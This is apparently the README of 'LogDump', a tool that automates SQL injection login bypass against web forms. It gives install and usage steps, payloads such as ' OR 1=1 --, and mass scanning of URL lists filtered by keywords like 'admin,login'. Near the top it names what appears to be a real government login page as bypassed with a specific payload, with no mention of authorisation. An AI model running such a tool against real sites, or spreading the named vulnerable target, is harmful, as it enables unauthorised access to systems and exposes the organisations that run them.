# LogDump

**LogDump** is an automated SQL injection testing tool designed to test login pages for vulnerabilities. It sends injection payloads into the username and password fields to check for potential security flaws. The tool supports both single URL testing and testing multiple URLs from a file, with logging, retry mechanisms, and multi-threading for improved performance.
# Vuln Link:
              **Login found: http://ptsp.pt-nad.go.id/aipda/page/login.php with payload: ' OR 1=1 -- -**
## Features

- **Automated SQL Injection Testing:** Test login pages with a variety of payloads to check for vulnerabilities.
- **Single URL Testing:** Test one URL at a time.
- **Multiple URL Testing:** Test multiple URLs from a file, with optional URL filtering based on keywords.
- **Logging:** Logs results of successful and failed injection attempts into separate log files.
- **Exponential Backoff Retry:** Automatically retries failed requests with an increasing delay.
- **Multi-threading:** Performs concurrent tests on multiple URLs and payloads for faster results.
- **Customizable Fields:** Allows customization of the username and password field names.

## Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/HackfutSec/LogDump.git
   ```

2. Navigate to the project directory:

   ```bash
   cd LogDump
   ```

3. Install the required dependencies:

   ```bash
   pip install -r requirements.txt
   ```

   If you don't have a `requirements.txt`, you can install the required libraries manually:

   ```bash
   pip install requests
   ```

## Usage

### 1. Test a Single URL

To test a single login URL, run the program and provide the URL when prompted:

```bash
python logdump.py
```

You will be asked to enter:

- **Username field name** (default: `username`)
- **Password field name** (default: `password`)
- **URL** to test

The program will attempt to bypass the login using a series of payloads and log the results.

### 2. Test Multiple URLs from a File

To test multiple URLs, the program will ask for the path to a file containing the URLs you want to test.

- URLs will be filtered based on keywords you provide (optional).
- The results will be logged and saved in the `results.txt` file.

```bash
python logdump.py
```

When prompted, enter:

- **File path** containing URLs to test.
- **Keywords** to filter URLs (optional).

### Logs

- **`success_injections.log`**: Logs successful injection attempts.
- **`error_injections.log`**: Logs errors or failed attempts.
- **`test_injections.log`**: General logs, including retries and requests.

The results of successful logins are also saved in a text file (`results.txt`).

### Custom Payloads

You can add custom payloads by editing the `payloads.json` file. This file should contain a list of payload strings, such as:

```json
[
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#"
]
```

## Configuration

You can customize the program by modifying the following parameters:

- **Username field name** and **Password field name**: Set default field names for the login form (default: `username`, `password`).
- **Payload file**: The default payload file is `payloads.json`. You can replace or modify it to suit your needs.

## Example

### Running the program with a single URL:

```bash
$ python logdump.py
Enter the URL to test (e.g., http://example.com/login.php): http://example.com/login.php
Enter the username field name (default 'username'): 
Enter the password field name (default 'password'): 
Testing with payload: ' OR 1=1 --
Testing with payload: ' OR 'a'='a
Login found with payload: ' OR 1=1 -- on URL http://example.com/login.php
Login found: http://example.com/login.php with payload: ' OR 1=1 --
```

### Running the program with multiple URLs from a file:

```bash
$ python logdump.py
Enter the path to the file containing the URLs to test: urls.txt
Enter the keywords to filter URLs (separated by commas): admin,login
```

## Logging

- **Success logs**: All successful injection attempts are logged in `success_injections.log`.
- **Error logs**: Errors, such as network issues or invalid responses, are logged in `error_injections.log`.
- **General logs**: General information, including retries, are stored in `test_injections.log`.

## Dependencies

- `requests`: A simple HTTP library for making requests.
- `concurrent.futures`: For multi-threading to run tests concurrently.

## Contributing

Contributions are welcome! Feel free to fork the repository, open issues, and submit pull requests.

### Steps to Contribute:

1. Fork this repository.
2. Create a new branch (`git checkout -b feature-name`).
3. Make your changes.
4. Commit your changes (`git commit -am 'Add new feature'`).
5. Push to the branch (`git push origin feature-name`).
6. Create a pull request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
